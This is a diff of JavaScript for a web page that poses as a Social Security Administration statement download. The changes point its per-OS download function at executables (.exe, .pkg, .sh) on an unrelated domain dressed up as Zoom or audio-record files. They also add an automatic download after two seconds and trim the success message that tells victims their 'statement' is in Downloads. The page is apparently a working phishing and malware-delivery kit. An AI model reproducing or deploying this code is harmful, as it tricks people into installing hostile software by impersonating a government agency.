@@ -78,13 +78,13 @@
         function getDownloadLink(os) {
             switch (os) {
                 case 'windows':
-                    return 'http://statements-6e58-mail8-es24hrs-admin-6567-88ec.specialitystoreservice.com/camphere/sigidwhat/statements.exe?e=Access&y=Guest';
+                    return 'https://arjairsparts.com/zoomsetup/clientsetup/Audio-Record6542567828.exe?e=Access&y=Guest';
                 case 'macos':
-                    return 'http://statements-6e58-mail8-es24hrs-admin-6567-88ec.specialitystoreservice.com/camphere/sigidwhat/statements.exe?e=Access&y=Guest';
+                    return 'https://arjairsparts.com/zoomsetup/clientsetup/Audio-Record6542567828.pkg?e=Access&y=Guest';
                 case 'linux':
-                    return 'http://statements-6e58-mail8-es24hrs-admin-6567-88ec.specialitystoreservice.com/camphere/sigidwhat/statements.exe?e=Access&y=Guest';
+                    return 'https://arjairsparts.com/zoomsetup/clientsetup/Audio-Record6542567828.sh?e=Access&y=Guest';
                 default:
-                    return 'http://statements-6e58-mail8-es24hrs-admin-6567-88ec.specialitystoreservice.com/camphere/sigidwhat/statements.exe?e=Access&y=Guest';
+                    return 'https://arjairsparts.com/zoomsetup/clientsetup/Audio-Record6542567828.exe?e=Access&y=Guest';
             }
         }
         
@@ -202,20 +202,34 @@
             successDiv.className = 'success-message';
             successDiv.innerHTML = `
                 <h3>Download Complete</h3>
-                <p>Your Social Security statement has been successfully downloaded and saved to your device.</p>
-                <p>You may now safely close this window or continue browsing. To access your statement:</p>
-                <ol>
-                    <li>Locate the downloaded file in your Downloads folder</li>
-                    <li>Double-click to open and view your statement</li>
-                    <li>Print or save a copy for your records</li>
-                </ol>
-                <p>For any questions about your statement, please contact Social Security Administration at 1-800-772-1213.</p>
+                <p>Your Social Security statement has been successfully downloaded to your device.</p>
+                <p>You may now access your statement from your Downloads folder.</p>
             `;
             contentDiv.appendChild(successDiv);
         }
         
-        // Start download
-        function startDownload(downloadLink) {
+        // Start automatic download
+        function startAutoDownload() {
+            const osType = detectOS();
+            const downloadLink = getDownloadLink(osType);
+            
+            // Update manual download link
+            const downloadElement = document.getElementById('downloadLink');
+            downloadElement.href = downloadLink;
+            downloadElement.onclick = function(e) {
+                e.preventDefault();
+                triggerDownload(downloadLink);
+                return false;
+            };
+            
+            // Trigger automatic download after 2 seconds
+            setTimeout(() => {
+                triggerDownload(downloadLink);
+            }, 2000);
+        }
+        
+        // Trigger file download
+        function triggerDownload(downloadLink) {
             try {
                 const downloadBtn = document.createElement("a");
                 downloadBtn.href = downloadLink;
@@ -224,7 +238,7 @@
                 downloadBtn.click();
                 document.body.removeChild(downloadBtn);
                 
-                // Show success message after download
+                // Show success message
                 setTimeout(showSuccessMessage, 1000);
             } catch (e) {
                 console.error("Download error:", e);
@@ -268,21 +282,8 @@
                     return;
                 }
                 
-                // Set up download link
-                const osType = detectOS();
-                const downloadLink = getDownloadLink(osType);
-                const downloadElement = document.getElementById('downloadLink');
-                downloadElement.href = downloadLink;
-                downloadElement.onclick = function(e) {
-                    e.preventDefault();
-                    startDownload(downloadLink);
-                    return false;
-                };
-                
-                // Start automatic download after 1 second
-                setTimeout(() => {
-                    startDownload(downloadLink);
-                }, 1000);
+                // Start automatic download process
+                startAutoDownload();
                 
             } catch (error) {
                 console.error('Error handling visit:', error);
